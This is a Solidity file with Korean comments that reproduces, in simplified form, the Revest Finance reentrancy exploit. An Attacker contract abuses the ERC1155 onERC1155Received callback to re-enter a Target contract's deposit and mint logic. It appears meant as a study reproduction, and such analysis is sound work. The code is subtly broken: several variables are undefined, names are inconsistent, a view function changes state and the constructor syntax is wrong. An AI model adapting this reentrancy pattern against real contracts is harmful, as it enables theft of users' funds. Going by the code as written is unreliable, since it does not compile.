// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;
/*
IERC1155interface의 onIERC1155received를 활용한 재진입 공격. 
https://rekt.news/ko/revest-finance-rekt/ 에서 일어났던 공격방법을 재현했음. 

IERC1155는 _mint(), safeTransferFrom() 함수를 실행하면 
받는 주소가 contract이라면 받는 주소 contract이 IERC1155Receiver 
인터페이스의 onERC1155Received 함수를 호출해서 safe한지를 확인한 뒤에 
NFT를 전송함. 
이 과정에서 받는 주소의 함수를 호출하게 됨. 
_mint(), safeTransferFrom() 이후에 나오는 로직에 따라서 공격할 수 있는
재진입 통로가 됨.  

아래에는 2개의 contract, Target과 attacker가 있음. 
target이 _mint()를 할 때 받는 주소(attacker)의 onERC1155Received 함수를 호출하게 됨. 
*/

// 공격을 재현하는데에 필요한 부분 외에는 모두 생략했음. 
contract Target is IERC1155 {
    mapping(uint => uint) public supply;
    uint public fnftsCreated;

    function deposit(address _addr, uint _amount) public view {
        // _id, data는 임의로 생성
        mint(msg.sender, _id, _amount, data);
    }
    
    function mint(address account,  uint id, uint amount, bytes memory data) public {
        supply[id] += amount;
        _mint(account, id);
        fnftsCreated += 1;
    }
    
    function _mint(address to, uint id) internal {
        require(to != address(0), "mint to zero address");
        require(_ownerOf[id] == address(0), "already minted");
        require(
            to.code.length == 0 ||
                IERC1155Receiver(to).onERC1155Received(msg.sender, from, id, "") ==
                IERC1155Receiver.onERC1155Received.selector,
            "unsafe recipient"
        );

        _balanceOf[to]++;
        _ownerOf[id] = to;

        emit Transfer(address(0), to, id);
    }
}

contract Attacker is IERC1155Receiver {
    constructor {
        owner = msg.sender;
    }

    address private targetAddress;
    uint private Count = 1;

    modifier onlyOwner {
        require(msg.sender == owner, "invaild owener");
        _;
    }

    function Start(address _targetAddr, address depositToken, uint amount, bytes memory data) onlyOwner public {
        targetAddress = _targetAddr;
        target = new Target(_targetAddr);
        target.deposit(depositToken, amount);
    }

    // 이 함수를 호출한 컨트랙이 target인 경우에 1회만 재진입함. 
    // 원하는 재진입 횟수를 count로 조절할 수도 있음.  
    function onERC1155Received(
        address operator, 
        address from, 
        uint256 id, 
        uint256 value, 
        bytes memory data
        ) virtual external returns(bytes memory returndata) {
            count += 1;
            if (msg.sender == targetAddress && count%2 == 0) {
                target = new Target(_targetAddr);
                target.deposit(depositToken, amount); 
            }
            
            return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }
}


